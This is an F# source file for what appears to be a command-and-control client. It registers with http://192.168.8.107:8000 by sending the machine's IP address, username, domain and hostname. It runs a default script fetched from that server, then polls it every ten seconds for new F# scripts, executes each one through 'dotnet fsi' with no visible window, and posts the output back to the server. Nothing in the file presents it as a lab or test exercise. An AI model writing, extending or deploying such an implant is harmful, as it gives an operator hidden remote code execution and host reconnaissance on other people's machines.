open System
open System.Net
open System.Net.Http
open System.Diagnostics
open System.Threading
open System.IO

// Function to get machine details
let getMachineDetails () =
    try
        let ipAddress = 
            (Dns.GetHostEntry(Dns.GetHostName())).AddressList 
            |> Array.tryFind (fun ip -> ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork) 
            |> Option.map (fun ip -> ip.ToString()) 
            |> Option.defaultValue "Unknown"
        let username = Environment.UserName
        let domainName = Environment.UserDomainName
        let hostName = Environment.MachineName
        sprintf "%s_%s_%s_%s" ipAddress username domainName hostName
    with
    | ex -> 
        printfn "Error fetching machine details: %s" ex.Message
        "Unknown_Client"

// Function to download the script content as a string
let downloadScriptContent (url: string) =
    try
        use client = new WebClient()
        let scriptContent = client.DownloadString(Uri(url))
        Some scriptContent
    with
    | ex -> 
        printfn "Error downloading script: %s" ex.Message
        None

// Function to send output to the web server
let sendOutputToServer (url: string) (message: string) (sessionId: string) =
    try
        use client = new HttpClient()
        let content = new StringContent(message, System.Text.Encoding.UTF8, "text/plain")
        let response = client.PostAsync(sprintf "%s/receiveOutput?clientId=%s" url sessionId, content).Result
        if response.IsSuccessStatusCode then
            printfn "Output sent to server successfully"
        else
            printfn "Failed to send output to server: %s" (response.ReasonPhrase)
    with
    | ex -> 
        printfn "Error sending output to server: %s" ex.Message

// Function to run the downloaded script content using dotnet fsi
let runScriptContent (scriptContent: string) (sessionId: string) =
    try
        let startInfo = ProcessStartInfo()
        startInfo.FileName <- "dotnet"
        startInfo.Arguments <- "fsi"
        startInfo.UseShellExecute <- false
        startInfo.RedirectStandardOutput <- true
        startInfo.RedirectStandardError <- true
        startInfo.RedirectStandardInput <- true
        startInfo.CreateNoWindow <- true

        use proc = Process.Start(startInfo)
        use stdInput = proc.StandardInput
        use stdOutput = proc.StandardOutput
        use stdError = proc.StandardError

        stdInput.WriteLine(scriptContent)
        stdInput.Close()

        let output = stdOutput.ReadToEnd()
        let errors = stdError.ReadToEnd()
        proc.WaitForExit()

        printfn "Script Output:\n%s" output
        if errors.Length > 0 then
            printfn "Script Errors:\n%s" errors

        // Send the output and errors to the web server
        let fullOutput = "Script Output:\n" + output + "\nScript Errors:\n" + errors
        sendOutputToServer "http://192.168.8.107:8000" fullOutput sessionId
    with
    | ex -> 
        printfn "Error running script: %s" ex.Message
        sendOutputToServer "http://192.168.8.107:8000" (sprintf "Exception: %s" ex.Message) sessionId

// Function to check for new scripts and run them
let checkForNewScripts (sessionId: string) =
    async {
        while true do
            try
                use client = new HttpClient()
                let url = sprintf "http://192.168.8.107:8000/scripts/currentscript/%s/currentscript.txt" sessionId
                let! scriptContentResponse = client.GetStringAsync(url) |> Async.AwaitTask
                if not (String.IsNullOrWhiteSpace(scriptContentResponse)) then
                    printfn "New script path received: %s" url
                    match downloadScriptContent url with
                    | Some scriptContent -> runScriptContent scriptContent sessionId
                    | None -> printfn "Failed to download the script."
                else
                    printfn "No script set for client or script content empty."
            with
            | ex -> printfn "Error checking for new scripts: %s" ex.Message
            do! Async.Sleep(10000) // Wait for 10 seconds before checking again
    }





// Function to execute the default script on the first check-in
let executeDefaultScript (sessionId: string) =
    async {
        match downloadScriptContent "http://192.168.8.107:8000/scripts/defaultscript/defaultscript.txt" with
        | Some scriptContent -> runScriptContent scriptContent sessionId
        | None -> printfn "Failed to download the default script."
    }

// Function to execute the script download and run logic
let executeScript (sessionId: string) =
    async {
        // Register the client with the web server
        try
            use client = new HttpClient()
            let content = new StringContent(getMachineDetails(), System.Text.Encoding.UTF8, "text/plain")
            let! response = client.PostAsync("http://192.168.8.107:8000/registerClient", content) |> Async.AwaitTask
            if response.IsSuccessStatusCode then
                printfn "Client registered successfully with session ID: %s" sessionId

                // Execute the default script on the first check-in
                do! executeDefaultScript sessionId

                // Start checking for new scripts
                Async.Start(checkForNewScripts sessionId)
            else
                printfn "Failed to register client: %s" (response.ReasonPhrase)
        with
        | ex -> 
            printfn "Error registering client: %s" ex.Message
    }

// Entry point for the program
[<EntryPoint>]
let main argv =
    // Get the machine details to use as client ID
    let sessionId = sprintf "Session%d" 1 // Set initial session ID
    executeScript sessionId |> Async.RunSynchronously
    
    // Keep the application running
    while true do
        Thread.Sleep(10000)

    0 // return an integer exit code
